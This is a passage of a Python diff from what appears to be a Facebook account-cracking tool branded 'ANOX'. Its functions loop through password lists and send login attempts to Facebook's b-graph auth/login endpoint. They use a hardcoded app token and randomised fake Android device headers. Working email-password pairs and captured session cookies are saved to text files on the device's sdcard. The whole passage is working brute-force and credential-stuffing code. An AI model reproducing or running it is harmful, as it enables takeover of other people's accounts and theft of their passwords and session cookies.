+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/1.8.4;FBDM/{density=0.75,width=320,height=240};FBLC/ru_RU;FB_FW/1;FBCR/AT&amp-T;FBNP/com.facebook.katana;FBSV/2.1-update1;]"+"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/U.S.Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920R4;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/69.0.0.2075;FBBV/4027810;[FBAN/FB4A;FBAV/406.0.0.26.90;FBBV/456153944;FBDM/{density=1.865,width=720,height=1465};FBLC/pt_BR;FBRV/4578887127;FBCR/CLARO BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A035M;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"                     
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sm=['GT-', 'SM-']
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'pt_BR','client_country_code': 'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+                        headers={'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                        print('\r\r\033[1;32m [-ANOX-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/ANOX420-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        oks.append(ids)
+                                        break
+                        elif twf in str(po):
+                                        if 'y' in pcp:
+                                                print('\r\r \033[1;34m[USMII-2F] '+ids+' | '+pas)
+                                                twf.append(ids)
+                                                break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                        if 'y' in pcp:
+                                                print('\r\r\x1b[1;31m [ALONE-ANOX-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/ANOX433-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
+                                        else:
+                                                open('/sdcard/ANOX-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
+                        else:
+                                        continue
+                loop+=1
+        except Exception as e:
+                pass
+def api1(ids,names,passlist):
+        global loop
+        global oks
+        sys.stdout.write('\r\r\033[1;37m [ANOX-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        try:
+                for pas in passlist:
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A' #OPEN SOURCE PUBLISHED BY HEX-PLUS
+                        fbpn = 'com.facebook.katana'
+                        en = random.choice(['en_US','en_GB'])
+                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/1.8.4;FBDM/{density=0.75,width=320,height=240};FBLC/ru_RU;FB_FW/1;FBCR/AT&amp-T;FBNP/com.facebook.katana;FBSV/2.1-update1;]"+"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/U.S.Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920R4;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/69.0.0.2075;FBBV/4027810;[FBAN/FB4A;FBAV/406.0.0.26.90;FBBV/456153944;FBDM/{density=1.865,width=720,height=1465};FBLC/pt_BR;FBRV/4578887127;FBCR/CLARO BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A035M;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sm=['GT-', 'SM-']
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {
+                                'adid':adid,
+                                'format':'json',
+                                'device_id':device_id,
+                                'email':ids,
+                                'password':pas,
+                                'generate_analytics_claims':'1',
+                                'credentials_type':'password',
+                                'source':'login',
+                                'error_detail_type':'button_with_disabled',
+                                'enroll_misauth':'false',
+                                'generate_session_cookies':'1',
+                                'generate_machine_id':'1',
+                                'fb_api_req_friendly_name':'authenticate',
+                        }
+                        headers={
+                                'Authorization':f'OAuth {accessToken}',
+                                'X-FB-Friendly-Name':'authenticate',
+                                'X-FB-Connection-Type':'unknown',
+                                'User-Agent':ua,
+                                'Accept-Encoding':'gzip, deflate',
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'X-FB-HTTP-Engine': 'Liger'
+                                }
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                try:
+                                        uid = po['uid']
+                                except:
+                                        uid = ids
+                                if str(uid) in oks:
+                                        break
+                                else:
+                                        print('\r\r\033[1;32m [LEGEND-USMII-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        #print("\r\r\033[1;33m Cookie: "+coki)
+                                        open('/sdcard/ANOX435-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/ANOX420-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        oks.append(str(uid))
+                                        break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                try:
+                                        uid = po['error']['error_data']['uid']
+                                except:
+                                        uid = ids
+                                if uid in oks:pass
+                                else:
+                                    #    print('\r\r\x1b[1;31m [USMII-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/ANOX433-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        cps.append(str(ids))
+                                        break
+                        else:continue
+                loop+=1
+        except Exception as e:
+                pass
+                        
+def rndm(ids,passlist):
+        global loop
+        global oks
+        sys.stdout.write('\r\r\033[1;37m [ANOX-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        try:
+                for pas in passlist:
+                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        en = random.choice(['en_US','en_GB'])
+                        motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
+                        mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
+                        mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
+                        bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
+                        mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
+                        mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
+                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/1.8.4;FBDM/{density=0.75,width=320,height=240};FBLC/ru_RU;FB_FW/1;FBCR/AT&amp-T;FBNP/com.facebook.katana;FBSV/2.1-update1;]"+"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/U.S.Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920R4;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/69.0.0.2075;FBBV/4027810;[FBAN/FB4A;FBAV/406.0.0.26.90;FBBV/456153944;FBDM/{density=1.865,width=720,height=1465};FBLC/pt_BR;FBRV/4578887127;FBCR/CLARO BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A035M;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sm=['GT-', 'SM-']
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+                        headers=  {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                try:
+                                        uid = po['uid']
+                                except:
+                                        uid = ids
+                                if str(uid) in oks:
+                                        break
+                                else:
+                                        print('\r\r\033[1;32m [ANOX-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        #print("\r\r\033[1;33m Cookie: "+coki)
+                                        open('/sdcard/ANOX420-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/ANOX420-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        oks.append(str(uid))
+                                        break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                try:
+                                        uid = po['error']['error_data']['uid']
+                                except:
+                                        uid = ids
+                                if uid in oks:pass
+                                else:
+                                    #    print('\r\r\x1b[1;31m [USMII-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/anoX420--CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        cps.append(str(ids))
+                                        break
+                        else:continue
+                loop+=1
+        except requests.exceptions.ConnectionError:
+                time.sleep(20)        
+        except Exception as e:
+                pass
+
+
+#try:
+#    
+#        approval()
+#except requests.exceptions.ConnectionError:
+#        print('\n No internet connection ...')
+#        exit()
+menu()
+#https://pasteit.free.nf/paste/fRWfQUer
